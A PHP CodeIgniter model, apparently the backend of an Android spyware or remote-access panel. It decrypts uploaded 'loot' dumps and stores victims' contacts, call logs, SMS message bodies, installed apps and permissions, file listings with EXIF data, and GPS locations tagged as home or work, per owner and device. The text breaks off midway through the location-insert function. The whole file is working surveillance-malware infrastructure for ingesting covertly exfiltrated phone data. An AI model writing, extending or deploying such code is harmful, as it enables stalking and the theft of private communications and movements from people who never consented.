<?php

namespace App\Models;

use CodeIgniter\Model;

class Mod_Parse_Loot extends Model
{
    /**
     * Parses and inserts contacts from modern JSON file (with batch insert).
     *
     * @param string $file_name
     * @param int $var_file_owner
     * @param string $var_file_print
     * @return bool
     */
    public function get_contacts(string $file_name, int $var_file_owner, string $var_file_print, int $fileRecordId = null): bool
    {
        try {
            $cryptModel = new Mod_Crypt();
            $dated = date('Y-m-d H:i:s');

            $loot_data = file_get_contents(WRITEPATH . 'uploads/text_dump/' . $file_name);
            if ($loot_data === false) {
                log_message('error', 'Failed to read file: ' . $file_name);
                return false;
            }

            $loot_decoded = $cryptModel->decode_content($loot_data);
            if ($loot_decoded === false) {
                log_message('error', 'Failed to decode file: ' . $file_name);
                return false;
            }

            $json = json_decode($loot_decoded, true);
            if ($json === null || !isset($json['contacts']) || !is_array($json['contacts'])) {
                log_message('error', 'Invalid JSON structure in contacts file: ' . $file_name);
                return false;
            }

            $extracted_at = $json['extracted_at'] ?? null;

            $batchData = [];
            foreach ($json['contacts'] as $contact) {
                if (!isset($contact['id']) || !isset($contact['display_name'])) {
                    continue; // Skip invalid entries
                }

$data = [
                'contact_id'         => $contact['id'],
                'display_name'       => $contact['display_name'],
                'phone_numbers'      => !empty($contact['phone_numbers']) ? json_encode($contact['phone_numbers']) : null,
                'phone_count'        => $contact['phone_count'] ?? count($contact['phone_numbers'] ?? []),
                'emails'             => !empty($contact['emails']) ? json_encode($contact['emails']) : null,
                'email_count'        => $contact['email_count'] ?? count($contact['emails'] ?? []),
                'photo_uri'          => $contact['photo_uri'] ?? null,
                'companies'          => !empty($contact['companies']) ? json_encode($contact['companies']) : null,
                'addresses'          => !empty($contact['addresses']) ? json_encode($contact['addresses']) : null,
                'notes'              => $contact['notes'] ?? null,
                'is_favorite'        => $contact['is_favorite'] ? 1 : 0,
                'last_contacted'     => $contact['last_time_contacted'] ?? null,
                'contact_frequency'  => $contact['times_contacted'] ?? 0,
                'contact_hash'       => $contact['contact_hash'] ?? null,
                'phonetic_name'      => $contact['phonetic_name'] ?? null,
                'nickname'           => $contact['nickname'] ?? null,
                'website'            => json_encode($contact['website'] ?? []),
                'im_handles'         => json_encode($contact['im_handles'] ?? []),
                'social_profiles'    => json_encode($contact['social_profiles'] ?? []),
                'events'             => json_encode($contact['events'] ?? []),
                'relation'           => json_encode($contact['relation'] ?? []),
                'sip_address'        => $contact['sip_address'] ?? null,
                'custom_fields'      => json_encode($contact['custom_fields'] ?? []),
                'group_membership'   => json_encode($contact['group_membership'] ?? []),
                'contact_last_updated' => $contact['contact_last_updated'] ?? null,
                'raw_contact_account_type' => json_encode($contact['raw_contact_account_type'] ?? []),
                'raw_contact_account_name' => (function() {
                    $rawContacts = $contact['raw_contact_account_type'] ?? [];
                    if (!is_array($rawContacts)) return null;
                    $names = [];
                    foreach ($rawContacts as $rc) {
                        if (is_array($rc) && isset($rc['account_name']) && $rc['account_name']) {
                            $names[] = $rc['account_name'];
                        }
                    }
                    return !empty($names) ? json_encode($names) : null;
                })(),
                'sync_status'        => $contact['sync_status'] ?? null,
                'is_restricted'      => isset($contact['is_restricted']) ? ($contact['is_restricted'] ? 1 : 0) : 0,
                'photo_thumbnail_base64' => $contact['photo_thumbnail_base64'] ?? null,
                'photo_file_id'      => $contact['photo_file_id'] ?? null,
                'display_name_source' => $contact['display_name_source'] ?? null,
                'phonetic_given_name' => $contact['phonetic_given_name'] ?? null,
                'phonetic_family_name' => $contact['phonetic_family_name'] ?? null,
                'transcription'      => $contact['transcription'] ?? null,
                'device_id'          => $var_file_print,
                'extracted_at'       => $extracted_at,
                'owner_id'           => $var_file_owner,
                'is_synced'          => 0,
                'sync_count'         => 0,
                'is_active'          => 1,
                'created_at'         => $dated,
                'updated_at'         => $dated,
            ];

                // Duplicate check using unique constraint fields
                $exists = $this->db->table('tbl_contacts')
                        ->where('contact_id', $data['contact_id'])
                        ->where('device_id', $data['device_id'])
                        ->where('owner_id', $data['owner_id'])
                        ->countAllResults() > 0;

                if (!$exists) {
                    $batchData[] = $data;
                }
            }

            if (!empty($batchData)) {
                $this->db->table('tbl_contacts')->insertBatch($batchData);
                log_message('info', 'Batch inserted ' . count($batchData) . ' contacts from ' . $file_name);
            }

            return true;
        } catch (\Exception $e) {
            log_message('error', 'get_contacts parse error for ' . $file_name . ': ' . $e->getMessage());
            return false;
        }
    }

    /**
     * Parses and inserts call logs from modern JSON file (with batch insert).
     *
     * @param string $file_name
     * @param int $var_file_owner
     * @param string $var_file_print
     * @return bool
     */
    public function get_logs(string $file_name, int $var_file_owner, string $var_file_print): bool
    {
        try {
            $cryptModel = new Mod_Crypt();
            $dated = date('Y-m-d H:i:s');

            $loot_data = file_get_contents(WRITEPATH . 'uploads/text_dump/' . $file_name);
            if ($loot_data === false) {
                log_message('error', 'Failed to read file: ' . $file_name);
                return false;
            }

            $loot_decoded = $cryptModel->decode_content($loot_data);
            if ($loot_decoded === false) {
                log_message('error', 'Failed to decode file: ' . $file_name);
                return false;
            }

            $json = json_decode($loot_decoded, true);
            
            // Handle both legacy 'call_logs' and modern 'calls' keys
            $callLogData = $json['call_logs'] ?? $json['calls'] ?? null;
            
            if ($json === null || !is_array($callLogData)) {
                log_message('error', 'Invalid JSON structure in call logs file: ' . $file_name);
                log_message('debug', 'JSON keys found: ' . implode(', ', array_keys($json ?? [])));
                return false;
            }

            $extracted_at = $json['extracted_at'] ?? null;

            $batchData = [];
            $skippedCount = 0;
            $duplicateCount = 0;
            
            log_message('info', 'Processing ' . count($callLogData) . ' call logs from ' . $file_name);
            
            foreach ($callLogData as $log) {
            if (!isset($log['phone_number']) || !isset($log['call_date'])) {
                $skippedCount++;
                log_message('debug', 'Skipped call log - missing required fields: ' . json_encode($log));
                continue; // Skip invalid
            }

                $logData = [
                    'contact_name'        => $log['contact_name'] ?? null,
                    'phone_number'        => $log['phone_number'],
                    'call_type'           => $log['call_type'] ?? 'Unknown',
                    'type_code'           => $log['type_code'] ?? 0,
                    'call_date'           => $log['call_date'],
                    'duration_seconds'    => $log['duration_seconds'] ?? 0,
                    'formatted_duration'  => $log['formatted_duration'] ?? '',
                    'country_iso'         => $log['country_iso'] ?? null,
                    'geocoded_location'   => $log['geocoded_location'] ?? null,
                    'number_label'        => $log['number_label'] ?? null,
                    'number_type'         => $log['number_type'] ?? 0,
                    'matched_number'      => $log['matched_number'] ?? null,
                    'is_read'             => $log['is_read'] ?? false,
                    'features'            => $log['features'] ?? 0,
                    'data_usage'          => $log['data_usage'] ?? 0,
                    'phone_account_component_name' => $log['phone_account_component_name'] ?? null,
                    'phone_account_id'    => $log['phone_account_id'] ?? null,
                    'is_conference'       => $log['is_conference'] ?? 0,
                    'conference_participants' => json_encode($log['conference_participants'] ?? []),
                    'parent_call_id'      => $log['parent_call_id'] ?? 0,
                    'is_voip'             => $log['is_voip'] ?? 0,
                    'voip_app_package'    => $log['voip_app_package'] ?? null,
                    'encryption_status'   => $log['encryption_status'] ?? 0,
                    'call_subject'        => $log['call_subject'] ?? null,
                    'call_notes'          => $log['call_notes'] ?? null,
                    'is_screening'        => $log['is_screening'] ?? 0,
                    'screening_result'    => $log['screening_result'] ?? null,
                    'call_companion_app'  => $log['call_companion_app'] ?? null,
                    'presentation'        => $log['presentation'] ?? null,
                    'cnap_name'           => $log['cnap_name'] ?? null,
                    'cnap_number'         => $log['cnap_number'] ?? null,
                    'redirecting_number'  => $log['redirecting_number'] ?? null,
                    'connected_number'    => $log['connected_number'] ?? null,
                    'dialing_number'      => $log['dialing_number'] ?? null,
                    'device_id'           => $var_file_print,
                    'extracted_at'        => $extracted_at ? date('Y-m-d H:i:s', substr($extracted_at, 0, -3)) : null,
                    'owner_id'            => $var_file_owner,
                    'created_at'          => $dated,
                    'updated_at'          => $dated,
                ];

                // Strong duplicate prevention: same number, exact timestamp, duration, type, device
                $exists = $this->db->table('tbl_logs')
                        ->where('phone_number', $logData['phone_number'])
                        ->where('call_date', $logData['call_date'])
                        ->where('duration_seconds', $logData['duration_seconds'])
                        ->where('call_type', $logData['call_type'])
                        ->where('device_id', $logData['device_id'])
                        ->where('owner_id', $logData['owner_id'])
                        ->countAllResults() > 0;

                if (!$exists) {
                $batchData[] = $logData;
            } else {
                $duplicateCount++;
                log_message('debug', 'Duplicate call log detected: ' . $logData['phone_number'] . ' at ' . $logData['call_date']);
            }
        }

        log_message('info', 'Call logs processing summary - Total: ' . count($json['call_logs']) . ', Skipped: ' . $skippedCount . ', Duplicates: ' . $duplicateCount . ', New: ' . count($batchData));

        if (!empty($batchData)) {
            $this->db->table('tbl_logs')->insertBatch($batchData);
            log_message('info', 'Batch inserted ' . count($batchData) . ' call logs from ' . $file_name);
        } else {
            log_message('warning', 'No new call logs to insert from ' . $file_name);
        }

            return true;
        } catch (\Exception $e) {
            log_message('error', 'get_logs parse error for ' . $file_name . ': ' . $e->getMessage());
            return false;
        }
    }
    /**
     * Parses and inserts apps from modern JSON file (with batch insert).
     *
     * @param string $file_name
     * @param int $var_file_owner
     * @param string $var_file_print
     * @return bool
     */
    public function get_apps(string $file_name, int $var_file_owner, string $var_file_print, int $fileRecordId = null): bool
    {
        try {
            $cryptModel = new Mod_Crypt();
            $dated = date('Y-m-d H:i:s');

            $loot_data = file_get_contents(WRITEPATH . 'uploads/text_dump/' . $file_name);
            if ($loot_data === false) {
                log_message('error', 'Failed to read file: ' . $file_name);
                return false;
            }

            $loot_decoded = $cryptModel->decode_content($loot_data);
            if ($loot_decoded === false) {
                log_message('error', 'Failed to decode file: ' . $file_name);
                return false;
            }

            $json = json_decode($loot_decoded, true);
            if ($json === null) {
                log_message('error', 'Invalid JSON structure in apps file: ' . $file_name);
                return false;
            }
            $appsData = $json['installed_apps'] ?? $json['apps'] ?? null;
            if (!is_array($appsData)) {
                log_message('error', 'Invalid JSON structure in apps file: ' . $file_name);
                return false;
            }

            $extracted_at = $json['extracted_at'] ?? null;
            $device_id = $json['device_id'] ?? $var_file_print;
            $device_model = $json['device_model'] ?? null;
            $android_version = $json['android_version'] ?? null;

            $batchData = [];
            foreach ($appsData as $app) {
                if (!isset($app['package_name']) || !isset($app['app_name'])) {
                    continue; // Skip invalid entries
                }

                //'meta_owner'         => $app['meta_owner'] ?? $var_file_owner,
                //'meta_owner'         => auth()->user()->id ?? null,

                $data = [
                    'package_name'                    => $app['package_name'],
                    'app_name'                        => $app['app_name'],
                    'version_name'                    => $app['version_name'] ?? null,
                    'version_code'                    => $app['version_code'] ?? null,
                    'first_install_time'              => $app['first_install_time'] ?? null,
                    'last_update_time'                => $app['last_update_time'] ?? null,
                    'installer_package_name'          => $app['installer_package_name'] ?? null,
                    'signatures_sha256'               => $app['signatures_sha256'] ?? null,
                    'cert_expiry'                     => $app['cert_expiry'] ?? null,
                    'is_system_app'                   => $app['is_system_app'] ? 1 : 0,
                    'is_instant_app'                  => $app['is_instant_app'] ? 1 : 0,
                    'is_archived'                     => $app['is_archived'] ? 1 : 0,
                    'is_suspended'                    => $app['is_suspended'] ? 1 : 0,
                    'hidden'                          => $app['hidden'] ? 1 : 0,
                    'disabled'                        => $app['disabled'] ? 1 : 0,
                    'category'                        => $app['category'] ?? null,
                    'target_sdk'                      => $app['target_sdk'] ?? null,
                    'min_sdk'                         => $app['min_sdk'] ?? null,
                    'permissions'                     => !empty($app['permissions']) ? json_encode($app['permissions']) : null,
                    'permission_count'                => $app['permission_count'] ?? 0,
                    'granted_runtime_permissions'     => !empty($app['granted_runtime_permissions']) ? json_encode($app['granted_runtime_permissions']) : null,
                    'denied_permissions'              => !empty($app['denied_permissions']) ? json_encode($app['denied_permissions']) : null,
                    'requested_permissions_flags'     => !empty($app['requested_permissions_flags']) ? json_encode($app['requested_permissions_flags']) : null,
                    'app_ops_mode'                    => $app['app_ops_mode'] ?? -1,
                    'activities'                      => !empty($app['activities']) ? json_encode($app['activities']) : null,
                    'services'                        => !empty($app['services']) ? json_encode($app['services']) : null,
                    'receivers'                       => !empty($app['receivers']) ? json_encode($app['receivers']) : null,
                    'providers'                       => !empty($app['providers']) ? json_encode($app['providers']) : null,
                    'native_libs'                     => !empty($app['native_libs']) ? json_encode($app['native_libs']) : null,
                    'abi'                             => !empty($app['abi']) ? json_encode($app['abi']) : null,
                    'uses_libraries'                  => !empty($app['uses_libraries']) ? json_encode($app['uses_libraries']) : null,
                    'app_size'                        => $app['app_size'] ?? 0,
                    'data_dir_size'                   => $app['data_dir_size'] ?? 0,
                    'cache_dir_size'                  => $app['cache_dir_size'] ?? 0,
                    'external_files_size'             => $app['external_files_size'] ?? 0,
                    'shared_prefs_count'              => $app['shared_prefs_count'] ?? 0,
                    'databases_count'                 => $app['databases_count'] ?? 0,
                    'last_used_time'                  => $app['last_used_time'] ?? null,
                    'first_launch_time'               => $app['first_launch_time'] ?? null,
                    'launch_count_30d'                => $app['launch_count_30d'] ?? 0,
                    'total_foreground_time_30d'       => $app['total_foreground_time_30d'] ?? null,
                    'owner_id'                        => $var_file_owner,
                    'device_id'                       => $device_id,
                    'device_model'                    => $device_model,
                    'android_version'                 => $android_version,
                    'extracted_at'                    => $extracted_at,
                    'created_at'                      => $dated,
                    'updated_at'                      => $dated,
                ];

                // Duplicate check: same package on same device for same user
                $exists = $this->db->table('tbl_apps')
                        ->where('package_name', $data['package_name'])
                        ->where('device_id', $data['device_id'])
                        ->where('owner_id', $data['owner_id'])
                        ->countAllResults() > 0;

                if (!$exists) {
                    $batchData[] = $data;
                } else {
                    // Update existing app info
                    $this->db->table('tbl_apps')
                        ->where('package_name', $data['package_name'])
                        ->where('device_id', $data['device_id'])
                        ->where('owner_id', $data['owner_id'])
                        ->update([
                            'app_name'                        => $data['app_name'],
                            'version_name'                    => $data['version_name'],
                            'version_code'                    => $data['version_code'],
                            'last_update_time'                => $data['last_update_time'],
                            'installer_package_name'          => $data['installer_package_name'],
                            'signatures_sha256'               => $data['signatures_sha256'],
                            'cert_expiry'                     => $data['cert_expiry'],
                            'is_system_app'                   => $data['is_system_app'],
                            'is_instant_app'                  => $data['is_instant_app'],
                            'is_archived'                     => $data['is_archived'],
                            'is_suspended'                    => $data['is_suspended'],
                            'hidden'                          => $data['hidden'],
                            'disabled'                        => $data['disabled'],
                            'category'                        => $data['category'],
                            'target_sdk'                      => $data['target_sdk'],
                            'min_sdk'                         => $data['min_sdk'],
                            'permissions'                     => $data['permissions'],
                            'permission_count'                => $data['permission_count'],
                            'granted_runtime_permissions'     => $data['granted_runtime_permissions'],
                            'denied_permissions'              => $data['denied_permissions'],
                            'requested_permissions_flags'     => $data['requested_permissions_flags'],
                            'app_ops_mode'                    => $data['app_ops_mode'],
                            'activities'                      => $data['activities'],
                            'services'                        => $data['services'],
                            'receivers'                       => $data['receivers'],
                            'providers'                       => $data['providers'],
                            'native_libs'                     => $data['native_libs'],
                            'abi'                             => $data['abi'],
                            'uses_libraries'                  => $data['uses_libraries'],
                            'app_size'                        => $data['app_size'],
                            'data_dir_size'                   => $data['data_dir_size'],
                            'cache_dir_size'                  => $data['cache_dir_size'],
                            'external_files_size'             => $data['external_files_size'],
                            'shared_prefs_count'              => $data['shared_prefs_count'],
                            'databases_count'                 => $data['databases_count'],
                            'last_used_time'                  => $data['last_used_time'],
                            'first_launch_time'               => $data['first_launch_time'],
                            'launch_count_30d'                => $data['launch_count_30d'],
                            'total_foreground_time_30d'       => $data['total_foreground_time_30d'],
                            'extracted_at'                    => $data['extracted_at'],
                            'updated_at'                      => $dated,
                        ]);
                }
            }

            if (!empty($batchData)) {
                $this->db->table('tbl_apps')->insertBatch($batchData);
                log_message('info', 'Batch inserted ' . count($batchData) . ' apps from ' . $file_name);
            }

            return true;
        } catch (\Exception $e) {
            log_message('error', 'get_apps parse error for ' . $file_name . ': ' . $e->getMessage());
            return false;
        }
    }

    /**
     * Parses and inserts SMS from file (with batch insert).
     *
     * @param string $file_name
     * @param int $var_file_owner
     * @param string $var_file_print
     * @return bool
     */
    public function get_sms(string $file_name, int $var_file_owner, string $var_file_print, int $fileRecordId = null): bool
    {
        try {
            $cryptModel   = new Mod_Crypt();
            $androidModel = new Mod_Android(); // Fixed: was AndroidModel()
            $dated        = date('Y-m-d H:i:s');

            /* ---------------------------------------------------------
             * Read encrypted dump file
             * --------------------------------------------------------- */
            $filePath = WRITEPATH . 'uploads/text_dump/' . $file_name;
            $rawData  = file_get_contents($filePath);

            if ($rawData === false) {
                log_message('error', 'Failed to read file: ' . $file_name);
                return false;
            }

            /* ---------------------------------------------------------
             * Decode encrypted content
             * --------------------------------------------------------- */
            $decoded = $cryptModel->decode_content($rawData);
            if ($decoded === false) {
                log_message('error', 'Failed to decode file: ' . $file_name);
                return false;
            }

            /* ---------------------------------------------------------
             * Decode JSON (NEW FORMAT)
             * --------------------------------------------------------- */
            $json = json_decode($decoded, true);
            if (!isset($json['sms']) || !is_array($json['sms'])) {
                log_message('error', 'Invalid SMS JSON structure: ' . $file_name);
                return false;
            }

            $extracted_at = $json['extracted_at'] ?? null;
            $smsList      = $json['sms'];
            $batchSize    = 500; // Safe batch size
            $batch        = [];

            /* ---------------------------------------------------------
             * Loop until ALL SMS are processed
             * --------------------------------------------------------- */
            foreach ($smsList as $sms) {

                if (empty($sms['address']) || empty($sms['date'])) {
                    continue; // Skip invalid rows
                }

                // Decode Base64 body
                $smsBody = '';
                $bodyEncoded = '';
                if (!empty($sms['body'])) {
                    $bodyEncoded = $sms['body']; // Store original base64
                    $smsBody = base64_decode($sms['body'], true) ?: '';
                }

                // Convert timestamps (keep as BIGINT for precision)
                $smsTime = $sms['date']; // Keep as milliseconds
                $dateSent = $sms['date_sent'] ?? null;

                // Calculate timestamp difference
                $timestampDiff = 0;
                if ($dateSent && $dateSent > 0) {
                    $timestampDiff = $smsTime - $dateSent;
                }

                $smsData = [
                    // Basic SMS Info (matching database schema)
                    'android_sms_id'     => $sms['sms_id'] ?? null,
                    'thread_id'          => $sms['thread_id'] ?? null,
                    'address'            => $androidModel
                        ->contacts_trim_number_length($sms['address']),
                    'formatted_address'  => $sms['formatted_address'] ?? null,
                    'sms_type'           => $sms['type'] ?? '',
                    'type_code'          => $sms['type_code'] ?? 0,

                    // Message Content
                    'body'               => $bodyEncoded, // Store base64 encoded body
                    'body_length'        => $sms['body_length'] ?? strlen($smsBody),

                    // Timestamps (store as BIGINT milliseconds)
                    'sms_date'           => $smsTime,
                    'sms_date_sent'      => $dateSent,

                    // Message Status
                    'is_read'            => $sms['is_read'] ?? true,
                    'is_seen'            => $sms['is_seen'] ?? true,
                    'status_code'        => $sms['status_code'] ?? 0,
                    'error_code'         => $sms['error_code'] ?? 0,

                    // Technical Details
                    'protocol'           => $sms['protocol'] ?? 0,
                    'protocol_type'      => $sms['protocol_type'] ?? 'SMS',
                    'is_mms'             => isset($sms['is_mms']) ? ($sms['is_mms'] ? 1 : 0) : 0,
                    'mms_subject'        => $sms['mms_subject'] ?? null,
                    'mms_attachments'    => json_encode($sms['mms_attachments'] ?? []),
                    'delivery_report'    => $sms['delivery_report'] ?? 0,
                    'reply_path_present' => $sms['reply_path_present'] ?? 0,
                    'is_spam'            => $sms['is_spam'] ?? 0,
                    'is_archived'        => $sms['is_archived'] ?? 0,
                    'is_scheduled'       => $sms['is_scheduled'] ?? 0,
                    'schedule_time'      => $sms['schedule_time'] ?? null,
                    'sub_id'             => $sms['sub_id'] ?? null,
                    'carrier_id'         => $sms['carrier_id'] ?? null,
                    'message_bundle_id'  => $sms['message_bundle_id'] ?? null,
                    'is_group'           => $sms['is_group'] ?? 0,
                    'rich_communication_service_data' => $sms['rich_communication_service_data'] ?? null,
                    'verified_sender'    => $sms['verified_sender'] ?? null,
                    'service_center'     => $sms['service_center'] ?? null,
                    'subject'            => $sms['subject'] ?? null,
                    'is_locked'          => $sms['is_locked'] ?? false,
                    'creator'            => $sms['creator'] ?? null,

                    // Metadata
                    'owner_id'           => $var_file_owner,
                    'device_id'          => $var_file_print,
                    'extracted_at'       => $extracted_at,

                    // Timestamps
                    'created_at'         => $dated,
                    'updated_at'         => $dated,
                ];

                /* -----------------------------------------------------
                 * Duplicate check (strong prevention)
                 * ----------------------------------------------------- */
                $exists = $this->db->table('tbl_sms')
                        ->where('android_sms_id', $smsData['android_sms_id'])
                        ->where('device_id', $smsData['device_id'])
                        ->where('owner_id', $smsData['owner_id'])
                        ->countAllResults() > 0;

                if (!$exists) {
                    $batch[] = $smsData;
                }

                /* -----------------------------------------------------
                 * Insert batch when limit is reached
                 * ----------------------------------------------------- */
                if (count($batch) >= $batchSize) {
                    $this->db->table('tbl_sms')->insertBatch($batch);
                    $batch = [];
                }
            }

            /* ---------------------------------------------------------
             * Insert remaining rows
             * --------------------------------------------------------- */
            if (!empty($batch)) {
                $this->db->table('tbl_sms')->insertBatch($batch);
            }

            log_message(
                'info',
                'SMS import completed for ' . $file_name . ' (' . count($smsList) . ' records processed)'
            );

            return true;

        } catch (\Throwable $e) {
            log_message(
                'error',
                'get_sms parse error for ' . $file_name . ': ' . $e->getMessage()
            );
            return false;
        }
    }

    /**
     * Parses and inserts device files from modern JSON file (with batch insert).
     *
     * @param string $file_name
     * @param int $var_file_owner
     * @param string $var_file_print
     * @param int|null $fileRecordId
     * @return bool|int Record count or false
     */
    public function get_files(string $file_name, int $var_file_owner, string $var_file_print, int $fileRecordId = null)
    {
        try {
            $cryptModel = new Mod_Crypt();
            $dated = date('Y-m-d H:i:s');

            $loot_data = file_get_contents(WRITEPATH . 'uploads/text_dump/' . $file_name);
            if ($loot_data === false) {
                log_message('error', 'Failed to read file: ' . $file_name);
                return false;
            }

            $loot_decoded = $cryptModel->decode_content($loot_data);
            if ($loot_decoded === false) {
                log_message('error', 'Failed to decode file: ' . $file_name);
                return false;
            }

            $json = json_decode($loot_decoded, true);
            if ($json === null || !isset($json['files']) || !is_array($json['files'])) {
                log_message('error', 'Invalid JSON structure in files file: ' . $file_name);
                return false;
            }

            $extracted_at = $json['extracted_at'] ?? null;
            $batchData = [];

            foreach ($json['files'] as $file) {
                if (!isset($file['path'])) {
                    continue; // Skip invalid entries
                }

                $data = [
                    'name'           => $file['name'] ?? basename($file['path']),
                    'path'           => $file['path'],
                    'path_hash'      => sha1((string) $file['path']),
                    'is_directory'   => isset($file['is_directory']) && $file['is_directory'] ? 1 : 0,
                    'size_bytes'     => $file['size_bytes'] ?? 0,
                    'last_modified'  => $file['last_modified'] ?? null,
                    'extension'      => $file['extension'] ?? null,
                    'formatted_size' => $file['formatted_size'] ?? null,
                    'formatted_date' => $file['formatted_date'] ?? null,
                    'category'       => $file['category'] ?? null,
                    'mime_type'              => $file['mime_type'] ?? null,
                    'magic_bytes'            => $file['magic_bytes'] ?? null,
                    'entropy'                => $file['entropy'] ?? null,
                    'is_encrypted'           => isset($file['is_encrypted']) ? ($file['is_encrypted'] ? 1 : 0) : 0,
                    'hash_sha256'            => $file['hash_sha256'] ?? null,
                    'hash_md5'               => $file['hash_md5'] ?? null,
                    'exif_data'              => json_encode($file['exif_data'] ?? []),
                    'media_duration'         => $file['media_duration'] ?? null,
                    'media_resolution'       => $file['media_resolution'] ?? null,
                    'media_bitrate'          => $file['media_bitrate'] ?? null,
                    'media_codec'            => $file['media_codec'] ?? null,
                    'document_page_count'    => $file['document_page_count'] ?? null,
                    'document_author'        => $file['document_author'] ?? null,
                    'document_title'         => $file['document_title'] ?? null,
                    'document_subject'       => $file['document_subject'] ?? null,
                    'document_keywords'      => $file['document_keywords'] ?? null,
                    'archive_contents_list'  => json_encode($file['archive_contents_list'] ?? []),
                    'archive_encrypted'      => isset($file['archive_encrypted']) ? ($file['archive_encrypted'] ? 1 : 0) : 0,
                    'apk_package_name'       => $file['apk_package_name'] ?? null,
                    'apk_version_code'       => $file['apk_version_code'] ?? null,
                    'apk_min_sdk'            => $file['apk_min_sdk'] ?? null,
                    'apk_target_sdk'         => $file['apk_target_sdk'] ?? null,
                    'apk_permissions'        => json_encode($file['apk_permissions'] ?? []),
                    'apk_signatures'         => json_encode($file['apk_signatures'] ?? []),
                    'certificate_info'       => json_encode($file['certificate_info'] ?? []),
                    'is_hidden'              => isset($file['is_hidden']) ? ($file['is_hidden'] ? 1 : 0) : 0,
                    'is_system_file'         => isset($file['is_system_file']) ? ($file['is_system_file'] ? 1 : 0) : 0,
                    'selinux_context'        => $file['selinux_context'] ?? null,
                    'extended_attributes'    => json_encode($file['extended_attributes'] ?? []),
                    'hard_link_count'        => $file['hard_link_count'] ?? 0,
                    'inode_number'           => $file['inode_number'] ?? 0,
                    'mount_point'            => $file['mount_point'] ?? null,
                    'owner_id'       => $var_file_owner,
                    'device_id'      => $var_file_print,
                    'extracted_at'   => $extracted_at,
                    'created_at'     => $dated,
                    'updated_at'     => $dated,
                ];

                // Duplicate check: Same path, device, and owner
                $exists = $this->db->table('tbl_device_files')
                        ->where('path_hash', $data['path_hash'])
                        ->where('device_id', $data['device_id'])
                        ->where('owner_id', $data['owner_id'])
                        ->countAllResults() > 0;

                if (!$exists) {
                    $batchData[] = $data;
                } else {
                    // Start Update existing file info
                     $this->db->table('tbl_device_files')
                        ->where('path_hash', $data['path_hash'])
                        ->where('device_id', $data['device_id'])
                        ->where('owner_id', $data['owner_id'])
                        ->update([
                            'size_bytes'     => $data['size_bytes'],
                            'last_modified'  => $data['last_modified'],
                            'formatted_size' => $data['formatted_size'],
                            'formatted_date' => $data['formatted_date'],
                            'updated_at'     => $dated,
                        ]); 
                }
            }

            if (!empty($batchData)) {
                $this->db->table('tbl_device_files')->insertBatch($batchData);
                log_message('info', 'Batch inserted ' . count($batchData) . ' files from ' . $file_name);
            }

            return count($batchData); // Return count similar to other methods
        } catch (\Exception $e) {
            log_message('error', 'get_files parse error for ' . $file_name . ': ' . $e->getMessage());
            return false;
        }
    }

    /**
     * Parses and inserts location and activity data from modern JSON file.
     *
     * @param string $file_name
     * @param int $var_file_owner
     * @param string $var_file_print
     * @param int|null $fileRecordId
     * @return bool|int Record count or false
     */
    public function get_location(string $file_name, int $var_file_owner, string $var_file_print, int $fileRecordId = null)
    {
        try {
            $cryptModel = new Mod_Crypt();
            $dated = date('Y-m-d H:i:s');

            $loot_data = file_get_contents(WRITEPATH . 'uploads/text_dump/' . $file_name);
            if ($loot_data === false) {
                log_message('error', 'Failed to read file: ' . $file_name);
                return false;
            }

            $loot_decoded = $cryptModel->decode_content($loot_data);
            if ($loot_decoded === false) {
                log_message('error', 'Failed to decode file: ' . $file_name);
                return false;
            }

            $json = json_decode($loot_decoded, true);
            if ($json === null) {
                log_message('error', 'Invalid JSON in location file: ' . $file_name);
                return false;
            }

            $extracted_at = $json['extracted_at'] ?? null;
            $recordsInserted = 0;

            // 1. Process Location Data (singular snapshot)
            if (isset($json['location'])) {
                if ($this->insertLocationRow($json['location'], $var_file_owner, $var_file_print, $extracted_at, $dated)) {
                    $recordsInserted++;
                }
            }

            // 1b. Process Location Data (array format from Room-persisted records)
            if (isset($json['locations']) && is_array($json['locations'])) {
                foreach ($json['locations'] as $loc) {
                    if ($this->insertLocationRow($loc, $var_file_owner, $var_file_print, $extracted_at, $dated)) {
                        $recordsInserted++;
                    }
                }
            }

            // 2. Process Activity Data (singular snapshot)
            if (isset($json['activity'])) {
                if ($this->insertActivityRow($json['activity'], $var_file_owner, $var_file_print, $extracted_at, $dated)) {
                    $recordsInserted++;
                }
            }

            // 2b. Process Activity Data (array format from Room-persisted records)
            if (isset($json['activities']) && is_array($json['activities'])) {
                foreach ($json['activities'] as $act) {
                    if ($this->insertActivityRow($act, $var_file_owner, $var_file_print, $extracted_at, $dated)) {
                        $recordsInserted++;
                    }
                }
            }

            // Trigger geo processing after location insert
            if ($recordsInserted > 0) {
                $this->triggerGeoProcessing($var_file_owner, $var_file_print);
            }

            return $recordsInserted;

        } catch (\Exception $e) {
            log_message('error', 'get_location exception: ' . $e->getMessage());
            return false;
        }
    }

    /**
     * Trigger geo intelligence processing after location insert.
     */
    private function triggerGeoProcessing(int $ownerId, string $devicePrint): void
    {
        try {
            $transition = new \App\Services\GeoTransitionDetector();
            $transition->processTransitions($ownerId, $devicePrint, 24);
        } catch (\Exception $e) {
            log_message('error', 'Geo trigger failed: ' . $e->getMessage());
        }
    }

    /**
     * Inserts a single location row.
     */
    private function insertLocationRow(array $loc, int $ownerId, string $devicePrint, ?string $extractedAt, string $dated): bool
    {
        $locationData = [
            'owner_id'      => $ownerId,
            'device_id'     => $devicePrint,
            'latitude'      => $loc['latitude'] ?? null,
            'longitude'     => $loc['longitude'] ?? null,
            'accuracy'      => $loc['accuracy'] ?? null,
            'altitude'      => $loc['altitude'] ?? null,
            'bearing'       => $loc['bearing'] ?? null,
            'speed'         => $loc['speed'] ?? null,
            'provider'      => $loc['provider'] ?? null,
            'location_time' => $loc['location_time'] ?? $loc['time'] ?? null,
            'status'                => $loc['status'] ?? (!empty($loc['latitude']) ? 'success' : 'no_location_found'),
            'geofence_transitions'  => json_encode($loc['geofence_transitions'] ?? []),
            'place_id'              => $loc['place_id'] ?? null,
            'place_name'            => $loc['place_name'] ?? null,
            'place_types'           => json_encode($loc['place_types'] ?? []),
            'place_address'         => $loc['place_address'] ?? null,
            'place_confidence'      => $loc['place_confidence'] ?? 0,
            'place_likelihood'      => $loc['place_likelihood'] ?? 0,
            'is_home'               => isset($loc['is_home']) ? ($loc['is_home'] ? 1 : 0) : 0,
            'is_work'               => isset($loc['is_work']) ? ($loc['is_work'] ? 1 : 0) : 0,
            'is_saved_place'        => isset($loc['is_saved_place']) ? ($loc['is_saved_place'] ? 1 : 0) : 0,
            'visit_duration_ms'     => $loc['visit_duration_ms'] ?? null,
            'arrival_time'          => $loc['arrival_time'] ?? null,
            'departure_time'        => $loc['departure_time'] ?? null,
